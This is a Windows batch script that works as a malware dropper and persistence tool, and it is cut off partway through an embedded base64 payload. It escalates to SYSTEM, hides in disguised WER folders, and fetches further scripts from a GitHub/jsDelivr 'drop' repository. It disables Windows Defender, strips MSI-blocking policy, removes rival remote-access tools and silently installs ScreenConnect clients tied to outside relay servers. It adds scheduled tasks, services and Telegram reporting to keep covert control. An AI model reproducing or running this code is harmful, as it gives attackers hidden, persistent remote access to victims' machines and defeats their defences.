@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O40 - Gryxa msiexec LOCK while any non-sevrz SC Running
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O40 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O40b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O40" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O40 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O40 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O40: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M30" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L17" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O40: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O40 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
rem O40: NEVER msiexec here — gryxa-ensure locks if any non-sevrz SC Running.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O40 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTMwDQpyZW0gIEdyeXhhOiBMT0NLIG1zaWV4ZWMgd2hpbGUgYW55IG5vbi1zZXZyeiBT
QyBSdW5uaW5nIChzdG9wIHBhbmVsIGR1cGxpY2F0ZXMpLg0KcmVtICBBdXRob3JpemVkIGludGVy
bmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4NCnJlbSDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZANCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCg0Kc2V0ICJLRUVQ
X0ZQPTVmNjAxMDU3OTg1MmU1MDciDQpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0
ICJHUllYQV9GUD05OTA4MTk4ZTY2OGU0NzUwIg0Kc2V0ICJXRD1DOlxQcm9ncmFtRGF0YVxNaWNy
b3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiRVRMPUM6XFByb2dyYW1EYXRh
XE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25f
bW9uLmxvZyINCnNldCAiU1RBVEU9JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdE
JVxoYi5mbGFnIg0Kc2V0ICJDVVJMPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSINCnNl
dCAiVEc9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vdGdfcmVwb3J0LnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIlRHMj1odHRw
czovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBv
cnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDPWh0dHBzOi8vcmF3LmdpdGh1
YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9zZWN1cmUuY21k
P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2ci5u
ZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZD90PSVSQU5ET00l
JVJBTkRPTSUiDQpzZXQgIk9XTk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUi
DQpzZXQgIk9XTk1PTjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
Yi1kcm9wQG1haW4vb3duX21vbi5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUI9
aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21h
aW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05MSUIyPWh0dHBzOi8v
Y2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMx
P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiTVNJX1VSTD1odHRwczovL3VpLnNldnJ6LmNvbS9C
aW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVzdCINCnNldCAi
TVNJX0dSWVhBPWh0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNl
dHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRo
dWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0
ICJNU0lfUEtHMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRy
b3BAbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNs
aWVudFNldHVwLm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cubXNpIg0Kc2V0ICJNU0lfRz0l
UHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3QuR3J5eGEubXNpIg0Kc2V0ICJNU0lDQUNIRV9HPSVX
RCVccGtnX2dyeXhhLm1zaSINCg0KaWYgbm90IGV4aXN0ICIlV0QlIiBtZCAiJVdEJSIgMj5udWwN
CmlmIG5vdCBleGlzdCAiJUxPRyUiIHR5cGUgbnVsPiIlTE9HJSIgMj5udWwNCg0Kc2V0ICJNT05W
RVI9TTMwIg0Kc2V0ICJQRjg2PSVQcm9ncmFtRmlsZXMoeDg2KSUiDQpzZXQgIkdSWVhBX0RFRVA9
JVdEJVxncnl4YV9kZWVwLmZsYWciDQpyZW0gbG9hZCBjdXJyZW50IEdyeXhhIEZQIChtYXkgcm90
YXRlIHdoZW4gc2VydmVyL2tleXMgY2hhbmdlKQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBm
b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEu
Y2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCmlm
IG5vdCBkZWZpbmVkIEdSWVhBX0ZQIHNldCAiR1JZWEFfRlA9OTkwODE5OGU2NjhlNDc1MCINCmZv
ciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9
JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEgW3Zl
ciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RBTExF
RD0wIg0Kc2V0ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xFRlQ9
MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g4pSA
4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tzIHJhY2lu
ZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2siDQppZiBleGlzdCAi
JU1VVEVYJSIgKA0KICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0lJX50
QSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYo
KFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJh
bFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCA4
KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwg
MSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVuZGxv
Y2FsDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9NJT4i
JU1VVEVYJSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUp
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYx
DQppZiBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEs
KiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJUwi
DQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIg0KaWYgbm90
IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZlckhlYWx0aCINCmlmIG5vdCBkZWZp
bmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlIb3N0UHJveHkiDQppZiBub3QgZGVmaW5lZCBUQVNL
X0Qgc2V0ICJUQVNLX0Q9VGNwSXBDb25mbGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Egc2V0
ICJNT19BPTIiDQppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSA
IFtBXSBhdXRvLXVwZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBub3QgZXhpc3QgIiVD
VVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0t
Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAi
JVRHJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVDVVJM
JSIgLUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9y
dC5uZXciICIlVEcyJSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVwb3J0
